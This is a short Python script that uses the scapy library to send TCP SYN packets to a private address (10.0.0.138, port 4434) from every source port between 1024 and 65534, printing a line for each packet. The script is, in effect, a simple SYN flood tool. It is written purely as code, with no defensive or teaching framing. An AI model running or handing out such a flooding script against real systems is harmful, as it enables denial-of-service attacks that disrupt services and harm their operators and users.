from scapy.all import IP, TCP, send
import random

target_ip = "10.0.0.138"
target_port = 4434


for i in range (1024,65535):
    source_port = i
    packet = IP(dst=target_ip) / TCP(sport=source_port, dport=target_port, flags="S", seq=random.randint(0, 4294967295))
    send(packet, verbose=False)
    print(f"SYN packet sent from port {source_port} to {target_ip}:{target_port}")